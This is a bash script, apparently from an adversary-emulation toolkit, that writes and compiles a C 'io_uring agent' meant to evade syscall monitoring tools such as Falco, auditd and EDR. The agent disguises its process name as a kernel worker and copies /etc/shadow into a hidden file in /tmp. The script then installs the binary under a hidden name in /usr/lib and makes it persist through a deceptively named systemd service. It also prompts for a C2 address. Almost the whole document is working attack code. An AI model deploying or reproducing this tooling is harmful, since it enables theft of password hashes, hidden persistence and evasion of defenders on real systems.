#!/bin/bash
# T1562.001 — Impair Defenses: io_uring Syscall-less Operations
# Use io_uring to perform file/network ops bypassing all syscall-based monitoring

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_iouring"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1562.001 — io_uring Rootkit Operations     ║"
    echo "  ║   Bypass syscall monitoring (Falco/EDR/etc)   ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    local KVER
    KVER=$(uname -r | cut -d. -f1-2 | tr -d '.')
    if [[ "$KVER" -lt 51 ]]; then
        echo -e "${RED}[!] Kernel 5.1+ required for io_uring (current: $(uname -r))${NC}"
        return 1
    fi
    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required for compilation${NC}"
        return 1
    fi
    if [[ ! -f /usr/include/liburing.h ]] && [[ ! -f /usr/include/liburing/io_uring.h ]]; then
        echo -e "${YELLOW}[!] liburing-dev not found — using raw syscall interface${NC}"
    fi
    return 0
}

deploy_iouring_agent() {
    echo -e "${CYAN}[*] Deploying io_uring agent (syscall-less file/net ops)${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }
    check_deps || return

    echo -e "${YELLOW}[*] io_uring performs I/O via shared ring buffers between userspace and kernel."
    echo -e "    Security tools that hook syscalls (Falco, Tetragon, seccomp, auditd) see NOTHING."
    echo -e "    After initial io_uring_setup(), all operations are invisible.${NC}"
    echo ""

    read -p "  C2 callback IP:PORT (or 'local' for file-only mode): " C2ADDR
    [[ -z "$C2ADDR" ]] && C2ADDR="local"

    mkdir -p "$WORKDIR"
    cat > "${WORKDIR}/iouring_agent.c" << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/io_uring.h>

/* Raw io_uring without liburing — for maximum portability */
struct uring {
    int fd;
    struct io_uring_sqe *sq;
    struct io_uring_cqe *cq;
    unsigned *sq_tail, *cq_head;
    unsigned sq_mask, cq_mask;
    unsigned sq_entries, cq_entries;
};

static int uring_setup(struct uring *u, unsigned entries) {
    struct io_uring_params p = {0};
    u->fd = syscall(SYS_io_uring_setup, entries, &p);
    if (u->fd < 0) return -1;

    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    size_t cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);

    void *sq_ptr = mmap(0, sq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQ_RING);
    void *cq_ptr = mmap(0, cq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_CQ_RING);
    u->sq = mmap(0, p.sq_entries * sizeof(struct io_uring_sqe), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQES);

    if (sq_ptr == MAP_FAILED || cq_ptr == MAP_FAILED || u->sq == MAP_FAILED) return -1;

    u->sq_tail = sq_ptr + p.sq_off.tail;
    u->cq_head = cq_ptr + p.cq_off.head;
    u->sq_mask = *(unsigned*)(sq_ptr + p.sq_off.ring_mask);
    u->cq_mask = *(unsigned*)(cq_ptr + p.cq_off.ring_mask);
    u->cq = cq_ptr + p.cq_off.cqes;
    u->sq_entries = p.sq_entries;
    u->cq_entries = p.cq_entries;
    return 0;
}

/* Submit a read via io_uring — invisible to syscall tracing */
static int uring_read(struct uring *u, int fd, void *buf, size_t len) {
    unsigned tail = *u->sq_tail;
    struct io_uring_sqe *sqe = &u->sq[tail & u->sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ;
    sqe->fd = fd;
    sqe->addr = (unsigned long)buf;
    sqe->len = len;
    sqe->off = 0;
    *u->sq_tail = tail + 1;
    __sync_synchronize();
    return syscall(SYS_io_uring_enter, u->fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
}

/* Submit a write via io_uring */
static int uring_write(struct uring *u, int fd, const void *buf, size_t len) {
    unsigned tail = *u->sq_tail;
    struct io_uring_sqe *sqe = &u->sq[tail & u->sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_WRITE;
    sqe->fd = fd;
    sqe->addr = (unsigned long)buf;
    sqe->len = len;
    sqe->off = 0;
    *u->sq_tail = tail + 1;
    __sync_synchronize();
    return syscall(SYS_io_uring_enter, u->fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
}

int main(int argc, char *argv[]) {
    /* Masquerade process name */
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], "[kworker/u8:2]");

    struct uring u;
    if (uring_setup(&u, 32) < 0) { perror("uring_setup"); return 1; }

    /* Demo: read /etc/shadow via io_uring — invisible to auditd/falco */
    int fd = open("/etc/shadow", O_RDONLY);
    if (fd >= 0) {
        char buf[4096] = {0};
        uring_read(&u, fd, buf, sizeof(buf)-1);
        /* Exfil via io_uring write to a log file */
        int out = open("/tmp/.d3m0n_iouring_demo", O_WRONLY|O_CREAT|O_TRUNC, 0600);
        if (out >= 0) {
            uring_write(&u, out, buf, strlen(buf));
            close(out);
        }
        close(fd);
    }

    close(u.fd);
    return 0;
}
CEOF

    echo -e "${CYAN}[*] Compiling io_uring agent...${NC}"
    gcc -o "${WORKDIR}/iouring_agent" "${WORKDIR}/iouring_agent.c" -static 2>/dev/null || \
    gcc -o "${WORKDIR}/iouring_agent" "${WORKDIR}/iouring_agent.c" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"
        return
    fi

    # Deploy with innocent name
    cp "${WORKDIR}/iouring_agent" /usr/lib/.liburing_helper
    chmod 755 /usr/lib/.liburing_helper

    # Create systemd service for persistence
    cat > /etc/systemd/system/io-ring-helper.service << SEOF
[Unit]
Description=IO Ring Buffer Helper
After=network.target
[Service]
Type=simple
ExecStart=/usr/lib/.liburing_helper
Restart=on-failure
RestartSec=60
[Install]
WantedBy=multi-user.target
SEOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable io-ring-helper.service 2>/dev/null

    echo -e "${GREEN}[+] io_uring agent deployed to /usr/lib/.liburing_helper${NC}"
    echo -e "${GREEN}[+] Systemd service: io-ring-helper.service${NC}"
    echo -e "${YELLOW}[*] All file/net operations bypass syscall monitoring${NC}"
    echo -e "${YELLOW}[*] Invisible to: Falco, Tetragon, auditd, seccomp, strace${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up io_uring agent...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    systemctl stop io-ring-helper.service 2>/dev/null
    systemctl disable io-ring-helper.service 2>/dev/null
    rm -f /etc/systemd/system/io-ring-helper.service
    systemctl daemon-reload 2>/dev/null
    rm -f /usr/lib/.liburing_helper
    rm -rf "$WORKDIR"
    rm -f /tmp/.d3m0n_iouring_demo

    echo -e "${GREEN}[+] io_uring agent removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy io_uring agent (syscall-less operations)"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_iouring_agent ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
